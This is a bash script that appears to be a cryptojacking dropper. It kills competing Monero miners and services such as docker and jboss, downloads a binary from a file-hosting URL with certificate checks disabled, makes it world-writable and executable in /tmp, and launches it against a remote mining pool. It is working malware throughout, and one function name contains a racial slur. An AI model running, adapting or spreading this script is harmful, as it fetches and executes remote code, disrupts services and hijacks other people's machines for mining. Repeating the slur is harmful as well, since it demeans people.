#!/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin
getnanoWatch(){
    ARCH=$(uname -i)
    if [ "$ARCH" == "x86_64" ]
    then
        rm -rf /tmp/nanoWatch*
        wget https://pixeldra.in/api/download/BsjL1_ --no-check-certificate -O /tmp/nanoWatch
            if [ $? -ne 0 -a $PS2 -eq 0 ];
            then
            curl -sk https://pixeldra.in/api/download/BsjL1_ -o /tmp/nanoWatch
            fi
    elif [ "$ARCH" == "i386" ]
    then
        rm -rf /tmp/nanoWatch*
        wget https://pixeldra.in/api/download/BsjL1_ --no-check-certificate -O /tmp/nanoWatch
            if [ $? -ne 0 -a $PS2 -eq 0 ];
            then
            curl -sk https://pixeldra.in/api/download/BsjL1_ -o /tmp/nanoWatch
            fi
    else
        rm -rf /tmp/nanoWatch*
        wget https://pixeldra.in/api/download/BsjL1_ --no-check-certificate -O /tmp/nanoWatch
            if [ $? -ne 0 -a $PS2 -eq 0 ];
            then
            curl -sk https://pixeldra.in/api/download/BsjL1_ -o /tmp/nanoWatch
            fi
    fi
}

killNiggiz(){
    ps -ef | grep crypto-pool | grep -v grep | awk '{print $2}' | xargs kill -9
    ps -ef | grep nanopool | grep -v grep | awk '{print $2}' | xargs kill -9
    ps -ef | grep supportxmr | grep -v grep | awk '{print $2}' | xargs kill -9
    ps -ef | grep minexmr | grep -v grep | awk '{print $2}' | xargs kill -9
    ps -ef | grep dwarfpool | grep -v grep | awk '{print $2}' | xargs kill -9
    ps -ef | grep xmrpool | grep -v grep | awk '{print $2}' | xargs kill -9
    ps -ef | grep moneropool | grep -v grep | awk '{print $2}' | xargs kill -9
    ps -ef | grep xmr | grep -v grep | awk '{print $2}' | xargs kill -9
    ps -ef | grep monero | grep -v grep | awk '{print $2}' | xargs kill -9
    ps -ef | grep udevs | grep -v grep | awk '{print $2}' | xargs kill -9
    ps -ef | grep udevd | grep -v grep | awk '{print $2}' | xargs kill -9
    ps -ef | grep docker | grep -v grep | awk '{print $2}' | xargs kill -9
    ps -ef | grep hashvault | grep -v grep | awk '{print $2}' | xargs kill -9
    ps -ef | grep moneroocean | grep -v grep | awk '{print $2}' | xargs kill -9
    ps -ef | grep evolutions | grep -v grep | awk '{print $2}' | xargs kill -9
    ps -ef | grep littletrump | grep -v grep | awk '{print $2}' | xargs kill -9
    ps -ef | grep jboss | grep -v grep | awk '{print $2}' | xargs kill -9
    skill -KILL crypto-pool
    skill -KILL nanopool
    skill -KILL supportxmr
    skill -KILL minexmr
    skill -KILL dwarfpool
    skill -KILL xmrpool
    skill -KILL moneropool
    skill -KILL xmr
    skill -KILL monero
    skill -KILL udevs
    skill -KILL udevd
    skill -KILL docker
    skill -KILL hashvault
    skill -KILL moneroocean
    skill -KILL evolutions
    skill -KILL littletrump
    skill -KILL jboss
}

killNiggiz

PS2=$(ps aux | grep nanoWatch | grep -v "grep" | wc -l)
if [ $PS2 -eq 0 ];
then
    getnanoWatch
fi
chmod +x /tmp/nanoWatch
chmod 777 /tmp/nanoWatch
if [ $PS2 -eq 0 ];
then
/tmp/nanoWatch -o pool.t00ls.ru:19000 -k -B
fi
